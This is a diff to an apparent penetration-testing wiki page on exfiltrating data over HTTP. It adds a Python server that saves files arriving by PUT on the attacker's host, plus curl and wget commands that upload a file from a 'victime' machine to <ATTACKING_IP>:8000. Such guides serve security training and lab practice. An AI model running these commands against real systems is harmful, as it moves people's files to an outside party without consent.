@@ -15,7 +15,7 @@ We can also use [HTTP(S) Tunneling](../pivoting/http-tunneling.md) as a good [ex
 ## Practice
 
 {% tabs %}
-{% tab title="Curl" %}
+{% tab title="POST" %}
 We will host a simple PHP server in order to retrieve encoded POST data.
 
 First write the following code in your `index.php` file
@@ -51,6 +51,60 @@ On attacking machine, we can decode now decode it:
 # Decode compressed folders
 v4resk㉿kali$ sed -i 's/ /+/g' /tmp/http.bs64
 v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
+```
+{% endtab %}
+
+{% tab title="PUT" %}
+Using the following code, we will host a simple python server in order to retrieve PUT data.&#x20;
+
+{% code title="http-put-server.py" %}
+```python
+#!/usr/bin/env python
+import os
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
+
+class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
+    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
+    def do_PUT(self):
+        """Save a file following a HTTP PUT request"""
+        filename = os.path.basename(self.path)
+
+        # Don't overwrite files
+        if os.path.exists(filename):
+            self.send_response(409, 'Conflict')
+            self.end_headers()
+            reply_body = '"%s" already exists\n' % filename
+            self.wfile.write(reply_body.encode('utf-8'))
+            return
+
+        file_length = int(self.headers['Content-Length'])
+        with open(filename, 'wb') as output_file:
+            output_file.write(self.rfile.read(file_length))
+        self.send_response(201, 'Created')
+        self.end_headers()
+        reply_body = 'Saved "%s"\n' % filename
+        self.wfile.write(reply_body.encode('utf-8'))
+
+if __name__ == '__main__':
+    server.test(HandlerClass=HTTPRequestHandler)
+```
+{% endcode %}
+
+On attacking host, start the server.
+
+```bash
+v4resk㉿kali$ python http-put-server.py
+```
+
+Then we can exfiltrate data from the victime host using `curl` or `wget`.
+
+```bash
+user@victime$ curl -X PUT --upload-file somefile.txt http://<ATTACKING_IP>:8000
+user@victime$ wget -O- --method=PUT --body-file=somefile.txt http://<ATTACKING_IP>:8000/somefile.txt
 ```
 {% endtab %}
 {% endtabs %}
